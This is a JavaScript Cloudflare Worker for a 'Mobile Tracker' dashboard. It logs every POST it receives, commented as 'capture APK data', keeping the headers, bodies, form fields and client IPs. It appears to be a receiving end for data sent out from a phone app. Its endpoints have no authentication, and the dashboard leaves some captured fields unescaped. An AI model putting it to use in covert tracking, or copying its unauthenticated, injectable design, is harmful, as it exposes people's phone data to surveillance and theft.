let captures = [];
const MAX_CAPTURES = 1000;

const DASHBOARD_HTML = '<!DOCTYPE html>\n<html dir="ltr" lang="en">\n<head>\n<meta charset="utf-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<meta name="theme-color" content="#337ab7">\n<title>Mobile Tracker - Live Dashboard</title>\n<link rel="icon" type="image/png" href="favicon.png">\n<style>\n* { box-sizing: border-box; }\nhtml { font-family: sans-serif; line-height: 1.15; }\nbody { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; font-size: 1rem; font-weight: 400; line-height: 1.5; color: #212529; text-align: left; background-color: #fff; }\nh1, h2, h3, h4, h5, h6 { margin-top: 0; margin-bottom: 0.5rem; }\np { margin-top: 0; margin-bottom: 1rem; }\na { color: #007bff; text-decoration: none; background-color: transparent; }\na:hover { color: #0056b3; text-decoration: underline; }\nhr { box-sizing: content-box; height: 0; overflow: visible; }\ntable { border-collapse: collapse; }\ncaption { padding-top: 0.75rem; padding-bottom: 0.75rem; color: #6c757d; text-align: left; caption-side: bottom; }\nth { text-align: inherit; }\nlabel { display: inline-block; margin-bottom: 0.5rem; }\nbutton { border-radius: 0; }\nbutton, input, optgroup, select, textarea { margin: 0; font-family: inherit; font-size: inherit; line-height: inherit; }\nbutton, input { overflow: visible; }\nbutton, select { text-transform: none; }\n.container { width: 100%; padding-right: 15px; padding-left: 15px; margin-right: auto; margin-left: auto; }\n.row { display: flex; flex-wrap: wrap; margin-right: -15px; margin-left: -15px; }\n.col-md-4 { position: relative; width: 100%; min-height: 1px; padding-right: 15px; padding-left: 15px; }\n.col-md-8 { position: relative; width: 100%; min-height: 1px; padding-right: 15px; padding-left: 15px; }\n.table { width: 100%; margin-bottom: 1rem; background-color: transparent; }\n.table td, .table th { padding: 0.75rem; vertical-align: top; border-top: 1px solid #dee2e6; }\n.table thead th { vertical-align: bottom; border-bottom: 2px solid #dee2e6; }\n.table-bordered { border: 1px solid #dee2e6; }\n.table-bordered td, .table-bordered th { border: 1px solid #dee2e6; }\n.form-control { display: block; width: 100%; height: calc(2.25rem + 2px); padding: 0.375rem 0.75rem; font-size: 1rem; line-height: 1.5; color: #495057; background-color: #fff; background-clip: padding-box; border: 1px solid #ced4da; border-radius: 0.25rem; }\n.btn { display: inline-block; font-weight: 400; text-align: center; white-space: nowrap; vertical-align: middle; border: 1px solid transparent; padding: 0.375rem 0.75rem; font-size: 1rem; line-height: 1.5; border-radius: 0.25rem; }\n.btn-primary { color: #fff; background-color: #007bff; border-color: #007bff; }\n.btn-danger { color: #fff; background-color: #dc3545; border-color: #dc3545; }\n.btn-success { color: #fff; background-color: #28a745; border-color: #28a745; }\n.alert { position: relative; padding: 0.75rem 1.25rem; margin-bottom: 1rem; border: 1px solid transparent; border-radius: 0.25rem; }\n.alert-danger { color: #721c24; background-color: #f8d7da; border-color: #f5c6cb; }\n.alert-success { color: #155724; background-color: #d4edda; border-color: #c3e6cb; }\n.alert-warning { color: #856404; background-color: #fff3cd; border-color: #ffeeba; }\n.card { position: relative; display: flex; flex-direction: column; min-width: 0; word-wrap: break-word; background-color: #fff; background-clip: border-box; border: 1px solid rgba(0,0,0,0.125); border-radius: 0.25rem; }\n.card-body { flex: 1 1 auto; padding: 1.25rem; }\n.badge { display: inline-block; padding: 0.25em 0.4em; font-size: 75%; font-weight: 700; line-height: 1; text-align: center; white-space: nowrap; vertical-align: baseline; border-radius: 0.25rem; }\n.badge-success { color: #fff; background-color: #28a745; }\n.badge-danger { color: #fff; background-color: #dc3545; }\n.badge-primary { color: #fff; background-color: #007bff; }\n.nav { display: flex; flex-wrap: wrap; padding-left: 0; margin-bottom: 0; list-style: none; }\n.nav-link { display: block; padding: 0.5rem 1rem; }\n.nav-tabs { border-bottom: 1px solid #dee2e6; }\n.nav-tabs .nav-link { border: 1px solid transparent; border-top-left-radius: 0.25rem; border-top-right-radius: 0.25rem; }\n.nav-tabs .nav-link.active { color: #495057; background-color: #fff; border-color: #dee2e6 #dee2e6 #fff; }\njumbotron { padding: 2rem 1rem; margin-bottom: 2rem; background-color: #e9ecef; border-radius: 0.3rem; }\n\n/* Dark theme */\nbody.dark { background-color: #0b0f19; color: #e2e8f0; }\nbody.dark .card { background-color: #1e293b; color: #e2e8f0; }\nbody.dark .table { color: #e2e8f0; }\nbody.dark .table td, body.dark .table th { border-color: #334155; }\nbody.dark .form-control { background-color: #0f172a; color: #e2e8f0; border-color: #334155; }\nbody.dark .alert-danger { background-color: #7f1d1d; color: #fecaca; border-color: #991b1b; }\nbody.dark .alert-success { background-color: #14532d; color: #bbf7d0; border-color: #15803d; }\n\n.topbar { background: #337ab7; color: #fff; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; }\n.topbar .logo { font-size: 1.5rem; font-weight: bold; }\n.topbar .user-info { font-size: 0.9rem; opacity: 0.9; }\n\n.stat-card { background: #fff; border-radius: 8px; padding: 20px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }\n.stat-card h3 { margin: 0; font-size: 2rem; color: #337ab7; }\n.stat-card p { margin: 5px 0 0; color: #666; font-size: 0.9rem; }\nbody.dark .stat-card { background: #1e293b; color: #e2e8f0; }\nbody.dark .stat-card h3 { color: #60a5fa; }\nbody.dark .stat-card p { color: #94a3b8; }\n\n.section-title { font-size: 1.25rem; font-weight: 600; margin: 30px 0 15px; color: #337ab7; }\nbody.dark .section-title { color: #60a5fa; }\n\n.empty-state { text-align: center; padding: 40px; color: #666; }\nbody.dark .empty-state { color: #94a3b8; }\n</style>\n</head>\n<body class="dark">\n<nav class="topbar">\n  <div class="logo">📡 Mobile Tracker Dashboard</div>\n  <div class="user-info">Admin • Session Active</div>\n</nav>\n\n<div class="container" style="padding: 20px;">\n  <div class="alert alert-warning">\n    ⚠️ <strong>Security Notice:</strong> This dashboard is for authorized device monitoring only. Unauthorized access is prohibited.\n  </div>\n\n  <div class="row" style="margin-bottom: 20px;">\n    <div class="col-md-4">\n      <div class="stat-card">\n        <h3 id="total-captures">0</h3>\n        <p>Total Requests Captured</p>\n      </div>\n    </div>\n    <div class="col-md-4">\n      <div class="stat-card">\n        <h3 id="unique-endpoints">0</h3>\n        <p>Unique Endpoints</p>\n      </div>\n    </div>\n    <div class="col-md-4">\n      <div class="stat-card">\n        <h3 id="last-capture">--</h3>\n        <p>Last Activity</p>\n      </div>\n    </div>\n  </div>\n\n  <h2 class="section-title">📊 Live Captured Requests</h2>\n  <button class="btn btn-danger" onclick="clearAll()" style="margin-bottom: 15px;">🗑️ Clear All Records</button>\n\n  <div class="card">\n    <div class="card-body">\n      <div class="table-responsive">\n        <table class="table table-bordered table-hover" id="captures-table">\n          <thead class="thead-dark">\n            <tr>\n              <th>Time</th>\n              <th>Method</th>\n              <th>Endpoint</th>\n              <th>Data / Body</th>\n              <th>IP</th>\n            </tr>\n          </thead>\n          <tbody id="tbody">\n            <tr><td colspan="5" class="empty-state">No requests captured yet. Send data from the app...</td></tr>\n          </tbody>\n        </table>\n      </div>\n    </div>\n  </div>\n</div>\n<script>\nlet captures = [];\nconst MAX_CAPTURES = 1000;\nasync function load() {\n  try {\n    const r = await fetch("/api/captures");\n    captures = await r.json();\n    render();\n  } catch (e) {\n    console.error("Failed to load captures:", e);\n  }\n}\nfunction render() {\n  const tb = document.getElementById("tbody");\n  const totalEl = document.getElementById("total-captures");\n  const lastEl = document.getElementById("last-capture");\n  if (!captures.length) {\n    tb.innerHTML = "<tr><td colspan=\"5\" class=\"empty-state\">No requests captured yet. Send data from the app...</td></tr>";\n    totalEl.textContent = "0";\n    lastEl.textContent = "--";\n    return;\n  }\n  const endpoints = new Set(captures.map(c => c.path));\n  document.getElementById("total-captures").textContent = captures.length;\n  document.getElementById("unique-endpoints").textContent = endpoints.size;\n  lastEl.textContent = new Date(captures[0].time).toLocaleString();\n  tb.innerHTML = captures.map(c => `<tr><td><small>${new Date(c.time).toLocaleString()}</small></td><td><span class="badge badge-primary">${c.method}</span></td><td><code>${c.path}${c.query ? "?" + new URLSearchParams(c.query).toString() : ""}</code></td><td><pre style="margin:0; font-size: 11px; white-space: pre-wrap; max-width: 300px;">${escapeHtml(typeof c.body === "string" ? c.body : JSON.stringify(c.body, null, 2)).slice(0, 500)}</pre></td><td>${c.ip}</td></tr>`).join("");\n}\nfunction escapeHtml(s) {\n  return String(s)\n    .replace(/&/g, "&amp;")\n    .replace(/</g, "&lt;")\n    .replace(/>/g, "&gt;")\n    .replace(/"/g, "&quot;")\n    .replace(/'/g, "&#39;");\n}\nasync function clearAll() {\n  if (!confirm("Clear all captured records?")) return;\n  try {\n    await fetch("/api/clear", { method: "POST" });\n    captures = [];\n    render();\n  } catch (e) {\n    alert("Failed to clear records");\n  }\n}\nsetInterval(load, 3000);\nload();\n</script>\n</body>\n</html>';

addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url);
  const method = request.method;
  const path = url.pathname;

  const cors = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
    'Access-Control-Allow-Headers': 'Content-Type'
  };

  if (method === 'OPTIONS') {
    return new Response(null, { headers: cors });
  }

  // Root - HTML Dashboard
  if (path === '/') {
    if (method !== 'GET') return new Response('Method not allowed', { status: 405 });
    return new Response(DASHBOARD_HTML, {
      headers: { 'content-type': 'text/html; charset=utf-8' }
    });
  }

  // API: Get captures
  if (path === '/api/captures' && method === 'GET') {
    return new Response(JSON.stringify(captures, null, 2), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  // API: Clear captures
  if (path === '/api/clear' && method === 'POST') {
    captures = [];
    return new Response(JSON.stringify({ ok: true, message: 'All records cleared' }), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  // Any POST - capture APK data
  if (method === 'POST') {
    let bodyPreview = null;
    let fields = {};
    let files = [];

    try {
      const contentType = request.headers.get('content-type') || '';

      if (contentType.includes('multipart/form-data')) {
        const formData = await request.formData();
        for (const [key, value] of formData.entries()) {
          if (value instanceof File) {
            files.push({
              fieldname: key,
              originalname: value.name,
              mimetype: value.type,
              size: value.size
            });
            fields[key] = '[FILE] ' + value.name;
          } else {
            fields[key] = value;
          }
        }
        bodyPreview = JSON.stringify(fields, null, 2);
      } else {
        const text = await request.text();
        bodyPreview = text;
        const params = new URLSearchParams(text);
        for (const [key, value] of params) fields[key] = value;
      }
    } catch (e) {
      bodyPreview = '[parse error] ' + String(e);
    }

    const cap = {
      id: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
      time: new Date().toISOString(),
      method: 'POST',
      path: path,
      query: Object.fromEntries(url.searchParams),
      headers: Object.fromEntries(request.headers.entries()),
      body: bodyPreview,
      fields: fields,
      files: files,
      ip: request.headers.get('cf-connecting-ip')
    };

    captures.unshift(cap);
    if (captures.length > MAX_CAPTURES) captures.pop();

    return new Response(JSON.stringify({ status: 'ok', captured_id: cap.id }), {
      headers: { ...cors, 'content-type': 'application/json' }
    });
  }

  return new Response('Not found', { status: 404, headers: cors });
}
